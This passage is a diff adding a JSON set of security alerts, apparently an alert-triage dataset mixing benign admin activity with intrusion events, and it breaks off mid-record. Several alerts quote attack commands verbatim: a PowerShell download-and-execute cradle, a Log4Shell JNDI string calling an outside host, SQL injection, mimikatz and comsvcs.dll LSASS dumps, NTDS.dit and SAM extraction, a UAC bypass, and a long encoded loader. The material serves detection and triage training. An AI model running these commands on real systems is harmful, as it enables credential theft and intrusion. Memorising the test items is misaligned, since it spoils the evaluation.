+    "title": "PowerShell bypass on WS-OPS-002",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-OPS-002 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-07T22:57:42Z",
+    "host": "WS-OPS-002",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0167",
+    "source": "edr",
+    "rule_name": "AV Signature Update Failed",
+    "title": "Signature update failed on WS-OPS-017",
+    "description": "Defender signature update failed on WS-OPS-017 (error 0x80240022). Last successful update 26 hours ago.",
+    "timestamp": "2026-10-13T15:15:13Z"
+  },
+  {
+    "id": "ALR-0168",
+    "source": "okta",
+    "rule_name": "Account Locked Out",
+    "title": "jsmith locked out",
+    "description": "jsmith locked out after 5 failed attempts from their usual device at the office, then self-service unlocked via verified MFA.",
+    "timestamp": "2026-10-02T15:52:48Z",
+    "user": "jsmith"
+  },
+  {
+    "id": "ALR-0169",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for bthompson",
+    "description": "bthompson received 15 MFA push requests in 15 minutes for sign-ins from 194.26.192.60. The user approved the last one.",
+    "timestamp": "2026-10-21T01:18:20Z",
+    "user": "bthompson",
+    "src_ip": "194.26.192.60",
+    "raw": {
+      "push_count": 15,
+      "approved": true
+    }
+  },
+  {
+    "id": "ALR-0170",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-FILE01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-FILE01 as svc_backup from external IP 185.220.101.12. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-02T22:48:23Z",
+    "host": "SRV-FILE01",
+    "user": "svc_backup",
+    "src_ip": "185.220.101.12",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0171",
+    "source": "okta",
+    "rule_name": "MFA Push Fatigue",
+    "title": "MFA push spam for nlee",
+    "description": "nlee received 31 MFA push requests in 15 minutes for sign-ins from 45.155.205.111. The user denied all of them.",
+    "timestamp": "2026-10-01T03:01:27Z",
+    "user": "nlee",
+    "src_ip": "45.155.205.111",
+    "raw": {
+      "push_count": 31,
+      "approved": false
+    }
+  },
+  {
+    "id": "ALR-0172",
+    "source": "windows_security",
+    "rule_name": "Audit Policy Change",
+    "title": "Audit policy updated on SRV-DC01",
+    "description": "Audit policy changed on SRV-DC01 by it-admin via Group Policy update during the approved maintenance window.",
+    "timestamp": "2026-10-12T21:45:03Z"
+  },
+  {
+    "id": "ALR-0173",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Blocked exploit attempt against SRV-WEB01",
+    "description": "WAF blocked a request from 185.220.101.37 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\". HTTP 403 returned.",
+    "timestamp": "2026-10-06T13:00:33Z",
+    "host": "SRV-WEB01",
+    "src_ip": "185.220.101.37",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 403,
+      "blocked": true
+    }
+  },
+  {
+    "id": "ALR-0174",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Exploit against SRV-WEB01 succeeded",
+    "description": "Request from 194.26.192.77 to SRV-WEB01 with payload '${jndi:ldap://194.26.192.77:1389/a}' returned HTTP 200. Minutes later, a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.",
+    "timestamp": "2026-10-01T11:31:06Z",
+    "host": "SRV-WEB01",
+    "src_ip": "194.26.192.77",
+    "raw": {
+      "payload": "${jndi:ldap://194.26.192.77:1389/a}",
+      "response_code": 200,
+      "blocked": false,
+      "webshell": "shell.aspx"
+    }
+  },
+  {
+    "id": "ALR-0175",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-OPS-006",
+    "description": "Encoded PowerShell command on WS-OPS-006 by cwhite, parent process explorer.exe. Decoded command downloads and executes a script from 185.220.101.33.",
+    "timestamp": "2026-10-16T18:22:53Z",
+    "host": "WS-OPS-006",
+    "user": "cwhite",
+    "dst_ip": "185.220.101.33",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMwAzAC8AYQAuAHAAcwAxACcAKQA=",
+      "parent": "explorer.exe",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.33/a.ps1')"
+    }
+  },
+  {
+    "id": "ALR-0176",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for ehernandez",
+    "description": "User ehernandez signed in from 203.0.113.10 (US) and then from 73.47.147.88 (BR) 39 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-06T03:40:49Z",
+    "user": "ehernandez",
+    "src_ip": "73.47.147.88",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "73.47.147.88",
+      "minutes_between": 39,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0177",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-OPS-005",
+    "description": "WS-OPS-005 sent HTTP POSTs to 194.26.192.69 every 30 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-21T10:22:06Z",
+    "host": "WS-OPS-005",
+    "dst_ip": "194.26.192.69",
+    "raw": {
+      "interval_seconds": 30,
+      "duration_hours": 6,
+      "requests": 720
+    }
+  },
+  {
+    "id": "ALR-0178",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against da_jsmith",
+    "description": "370 failed logins for da_jsmith from 185.220.101.13 in 4 minutes.",
+    "timestamp": "2026-10-12T06:19:16Z",
+    "user": "da_jsmith",
+    "src_ip": "185.220.101.13",
+    "raw": {
+      "failed_count": 370,
+      "window_minutes": 4,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0179",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-WEB01",
+    "description": "Account sysadm created and added to local Administrators on SRV-WEB01 by it-admin during business hours. Matches change ticket CHG-32427.",
+    "timestamp": "2026-10-13T17:29:08Z",
+    "host": "SRV-WEB01",
+    "user": "it-admin",
+    "raw": {
+      "new_account": "sysadm",
+      "change_ticket": true
+    }
+  },
+  {
+    "id": "ALR-0180",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-OPS-001",
+    "description": "WS-OPS-001 sent HTTP POSTs to 194.26.192.68 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-21T01:22:37Z",
+    "host": "WS-OPS-001",
+    "dst_ip": "194.26.192.68",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0181",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 185.220.101.29",
+    "description": "Single IP 185.220.101.29 attempted logins against 15 different accounts (1-2 attempts each) in 10 minutes using common passwords. One attempt succeeded for bthompson.",
+    "timestamp": "2026-10-09T09:48:45Z",
+    "src_ip": "185.220.101.29",
+    "user": "bthompson",
+    "raw": {
+      "targeted_accounts": [
+        "bthompson",
+        "tmartin",
+        "omoore",
+        "dnguyen",
+        "lchen",
+        "sjohnson",
+        "ehernandez",
+        "kwilliams",
+        "cwhite",
+        "mgarcia",
+        "pjackson",
+        "nlee",
+        "rbrown",
+        "jsmith",
+        "apatel"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": [
+        "bthompson"
+      ]
+    }
+  },
+  {
+    "id": "ALR-0182",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-SALES-008",
+    "description": "7-zip_setup.exe executed on WS-SALES-008 by lchen; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-11T23:33:22Z",
+    "host": "WS-SALES-008",
+    "user": "lchen",
+    "file_hash": "351417bee8c0766b870ab0ddaae3fe20320be0546a69294a45ead358e31dfd84",
+    "file": {
+      "name": "7-zip_setup.exe",
+      "path": "C:\\Users\\lchen\\Downloads\\7-zip_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0183",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against svc_backup",
+    "description": "92 failed logins for svc_backup from 185.220.101.31 in 3 minutes. A successful login for svc_backup from the same IP followed 30 seconds later.",
+    "timestamp": "2026-10-13T04:09:50Z",
+    "user": "svc_backup",
+    "src_ip": "185.220.101.31",
+    "raw": {
+      "failed_count": 92,
+      "window_minutes": 3,
+      "subsequent_success": true,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0184",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-FILE01",
+    "description": "Account backup_adm created and added to local Administrators on SRV-FILE01 by it-admin during business hours. Matches change ticket CHG-45890.",
+    "timestamp": "2026-10-07T15:40:58Z",
+    "host": "SRV-FILE01",
+    "user": "it-admin",
+    "raw": {
+      "new_account": "backup_adm",
+      "change_ticket": true
+    }
+  },
+  {
+    "id": "ALR-0185",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-DC02",
+    "description": "Account backup_adm created and added to local Administrators on SRV-DC02 by it-admin during business hours. Matches change ticket CHG-70806.",
+    "timestamp": "2026-10-02T14:25:54Z",
+    "host": "SRV-DC02",
+    "user": "it-admin",
+    "raw": {
+      "new_account": "backup_adm",
+      "change_ticket": true
+    }
+  },
+  {
+    "id": "ALR-0186",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 194.26.192.68",
+    "description": "Single IP 194.26.192.68 attempted logins against 11 different accounts (1-2 attempts each) in 10 minutes using common passwords.",
+    "timestamp": "2026-10-14T22:36:37Z",
+    "src_ip": "194.26.192.68",
+    "raw": {
+      "targeted_accounts": [
+        "tmartin",
+        "bthompson",
+        "kwilliams",
+        "sjohnson",
+        "jsmith",
+        "lchen",
+        "pjackson",
+        "rbrown",
+        "cwhite",
+        "dnguyen",
+        "mgarcia"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": []
+    }
+  },
+  {
+    "id": "ALR-0187",
+    "source": "okta",
+    "rule_name": "Multiple Failed Logins",
+    "title": "4 failed logins for cwhite",
+    "description": "4 failed logins for cwhite from 10.20.12.166 (WS-FIN-016) in 5 minutes, followed by a successful login. Password for cwhite was changed 1 day ago.",
+    "timestamp": "2026-10-15T20:20:16Z",
+    "user": "cwhite",
+    "src_ip": "10.20.12.166",
+    "host": "WS-FIN-016",
+    "raw": {
+      "failed_count": 4,
+      "window_minutes": 5,
+      "subsequent_success": true,
+      "password_last_changed_days": 1
+    }
+  },
+  {
+    "id": "ALR-0188",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-FIN-013",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-FIN-013 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-14T17:50:25Z",
+    "host": "WS-FIN-013",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0189",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by bthompson",
+    "description": "bthompson uploaded 2.6 GB to acme-my.sharepoint.com (company-sanctioned SharePoint) from WS-FIN-021 during work hours.",
+    "timestamp": "2026-10-16T21:01:39Z",
+    "user": "bthompson",
+    "host": "WS-FIN-021",
+    "raw": {
+      "destination": "acme-my.sharepoint.com",
+      "bytes_out_gb": 2.6,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0190",
+    "source": "okta",
+    "rule_name": "Multiple Failed Logins",
+    "title": "3 failed logins for it-admin",
+    "description": "3 failed logins for it-admin from 10.20.25.214 (WS-HR-015) in 3 minutes, followed by a successful login. Password for it-admin was changed 1 day ago.",
+    "timestamp": "2026-10-04T14:16:34Z",
+    "user": "it-admin",
+    "src_ip": "10.20.25.214",
+    "host": "WS-HR-015",
+    "raw": {
+      "failed_count": 3,
+      "window_minutes": 3,
+      "subsequent_success": true,
+      "password_last_changed_days": 1
+    }
+  },
+  {
+    "id": "ALR-0191",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-EXCH01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-EXCH01 as admin from external IP 185.220.101.35. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-19T14:34:13Z",
+    "host": "SRV-EXCH01",
+    "user": "admin",
+    "src_ip": "185.220.101.35",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0192",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-HR-018",
+    "description": "Process dumped lsass.exe memory on WS-HR-018 under jsmith. Command: mimikatz.exe sekurlsa::logonpasswords",
+    "timestamp": "2026-10-12T16:21:26Z",
+    "host": "WS-HR-018",
+    "user": "jsmith",
+    "process": {
+      "command_line": "mimikatz.exe sekurlsa::logonpasswords",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0193",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 45.155.205.128",
+    "description": "Single IP 45.155.205.128 attempted logins against 11 different accounts (1-2 attempts each) in 10 minutes using common passwords.",
+    "timestamp": "2026-10-13T01:00:04Z",
+    "src_ip": "45.155.205.128",
+    "raw": {
+      "targeted_accounts": [
+        "bthompson",
+        "lchen",
+        "rbrown",
+        "tmartin",
+        "mgarcia",
+        "ehernandez",
+        "dnguyen",
+        "jsmith",
+        "cwhite",
+        "pjackson",
+        "apatel"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": []
+    }
+  },
+  {
+    "id": "ALR-0194",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-HR-006",
+    "description": "WS-HR-006 sent HTTP POSTs to 194.26.192.60 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-22T11:37:16Z",
+    "host": "WS-HR-006",
+    "dst_ip": "194.26.192.60",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0195",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against svc_backup",
+    "description": "152 failed logins for svc_backup from 45.155.205.120 in 5 minutes. A successful login for svc_backup from the same IP followed 30 seconds later.",
+    "timestamp": "2026-10-06T04:59:49Z",
+    "user": "svc_backup",
+    "src_ip": "45.155.205.120",
+    "dst_host": "SRV-DC01",
+    "raw": {
+      "failed_count": 152,
+      "window_minutes": 5,
+      "subsequent_success": true,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0196",
+    "source": "windows_security",
+    "rule_name": "Multiple Failed Logins",
+    "title": "4 failed logins for rbrown",
+    "description": "4 failed logins for rbrown from 10.20.10.92 (WS-SALES-014) in 5 minutes, followed by a successful login. Password for rbrown was changed 1 day ago.",
+    "timestamp": "2026-10-21T20:29:18Z",
+    "user": "rbrown",
+    "src_ip": "10.20.10.92",
+    "host": "WS-SALES-014",
+    "raw": {
+      "failed_count": 4,
+      "window_minutes": 5,
+      "subsequent_success": true,
+      "password_last_changed_days": 1
+    }
+  },
+  {
+    "id": "ALR-0197",
+    "source": "edr",
+    "rule_name": "UAC Bypass",
+    "title": "UAC bypass on WS-OPS-002",
+    "description": "Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on WS-OPS-002.",
+    "timestamp": "2026-10-21T04:49:53Z",
+    "host": "WS-OPS-002",
+    "user": "tmartin",
+    "process": {
+      "name": "fodhelper.exe",
+      "child": "C:\\Users\\Public\\p.exe",
+      "integrity": "high"
+    }
+  },
+  {
+    "id": "ALR-0198",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-OPS-005",
+    "description": "Process dumped lsass.exe memory on WS-OPS-005 under sjohnson. Command: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+    "timestamp": "2026-10-13T21:16:27Z",
+    "host": "WS-OPS-005",
+    "user": "sjohnson",
+    "process": {
+      "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0199",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for sjohnson",
+    "description": "User sjohnson signed in from 203.0.113.10 (US) and then from 73.63.48.228 (RO) 30 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-08T20:19:20Z",
+    "user": "sjohnson",
+    "src_ip": "73.63.48.228",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "73.63.48.228",
+      "minutes_between": 30,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0200",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from WS-HR-007",
+    "description": "Workstation WS-HR-007 (10.20.40.165) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in 3 minutes. This host has no history of scanning.",
+    "timestamp": "2026-10-03T21:57:23Z",
+    "host": "WS-HR-007",
+    "src_ip": "10.20.40.165",
+    "raw": {
+      "hosts_scanned": 180,
+      "ports": [
+        445,
+        3389,
+        5985,
+        22
+      ],
+      "scheduled": false
+    }
+  },
+  {
+    "id": "OTRF-0001",
+    "source": "sysmon",
+    "rule_name": "LSASS Memory Dump via comsvcs.dll",
+    "title": "LSASS Memory Dump via comsvcs.dll on WORKSTATION5",
+    "description": "Sysmon event 1 on WORKSTATION5: \"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 756 C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full (parent: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe)",
+    "timestamp": "2020-10-18T23:50:05.910Z",
+    "host": "WORKSTATION5",
+    "user": "WORKSTATION5\\wardog",
+    "process": {
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "command_line": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 756 C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+    "raw": {
+      "Hostname": "WORKSTATION5",
+      "User": "WORKSTATION5\\wardog",
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 756 C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentCommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ",
+      "UtcTime": "2020-10-18 23:50:05.910",
+      "EventID": 1,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: credential_access/host/psh_lsass_memory_dump_comsvcs.zip"
+  },
+  {
+    "id": "OTRF-0002",
+    "source": "sysmon",
+    "rule_name": "Suspicious LSASS Process Access",
+    "title": "Suspicious LSASS Process Access on WORKSTATION5.theshire.local",
+    "description": "Sysmon event 10 on WORKSTATION5.theshire.local: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -> C:\\windows\\system32\\lsass.exe (access 0x1010)",
+    "timestamp": "2020-08-07T14:32:56.540Z",
+    "host": "WORKSTATION5.theshire.local",
+    "user": null,
+    "process": {
+      "image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": null,
+      "parent": null
+    },
+    "raw": {
+      "Hostname": "WORKSTATION5.theshire.local",
+      "SourceImage": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "TargetImage": "C:\\windows\\system32\\lsass.exe",
+      "GrantedAccess": "0x1010",
+      "UtcTime": "2020-08-07 14:32:56.540",
+      "EventID": 10,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: credential_access/host/empire_mimikatz_logonpasswords.zip"
+  },
+  {
+    "id": "OTRF-0003",
+    "source": "sysmon",
+    "rule_name": "NTDS.dit Extraction via ntdsutil",
+    "title": "NTDS.dit Extraction via ntdsutil on DC01.pandalab.com",
+    "description": "Sysmon event 1 on DC01.pandalab.com: ntdsutil  \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q (parent: C:\\Windows\\System32\\cmd.exe)",
+    "timestamp": "2023-07-19T16:03:37.257Z",
+    "host": "DC01.pandalab.com",
+    "user": "PANDALAB\\Administrator",
+    "process": {
+      "image": "C:\\Windows\\System32\\ntdsutil.exe",
+      "command_line": "ntdsutil  \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q",
+      "parent": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "raw": {
+      "Hostname": "DC01.pandalab.com",
+      "User": "PANDALAB\\Administrator",
+      "Image": "C:\\Windows\\System32\\ntdsutil.exe",
+      "CommandLine": "ntdsutil  \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" ",
+      "UtcTime": "2023-07-19 16:03:37.257",
+      "EventID": 1,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: credential_access/host/cmd_dumping_ntds_dit_file_ntdsutil.zip"
+  },
+  {
+    "id": "OTRF-0004",
+    "source": "sysmon",
+    "rule_name": "SAM Hive Copy via esentutl",
+    "title": "SAM Hive Copy via esentutl on WORKSTATION5",
+    "description": "Sysmon event 1 on WORKSTATION5: esentutl.exe  /y /vss C:\\windows/system32/config/SAM /d C:\\ProgramData\\SAM (parent: C:\\Windows\\System32\\cmd.exe)",
+    "timestamp": "2020-10-19T04:28:31.089Z",
+    "host": "WORKSTATION5",
+    "user": "WORKSTATION5\\wardog",
+    "process": {
+      "image": "C:\\Windows\\System32\\esentutl.exe",
+      "command_line": "esentutl.exe  /y /vss C:\\windows/system32/config/SAM /d C:\\ProgramData\\SAM",
+      "parent": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "raw": {
+      "Hostname": "WORKSTATION5",
+      "User": "WORKSTATION5\\wardog",
+      "Image": "C:\\Windows\\System32\\esentutl.exe",
+      "CommandLine": "esentutl.exe  /y /vss C:\\windows/system32/config/SAM /d C:\\ProgramData\\SAM",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "\"C:\\windows\\system32\\cmd.exe\" ",
+      "UtcTime": "2020-10-19 04:28:31.089",
+      "EventID": 1,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: credential_access/host/cmd_sam_copy_esentutl.zip"
+  },
+  {
+    "id": "OTRF-0005",
+    "source": "sysmon",
+    "rule_name": "Encoded PowerShell from Script Host",
+    "title": "Encoded PowerShell from Script Host on WORKSTATION5.theshire.local",
+    "description": "Sysmon event 1 on WORKSTATION5.theshire.local: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdAB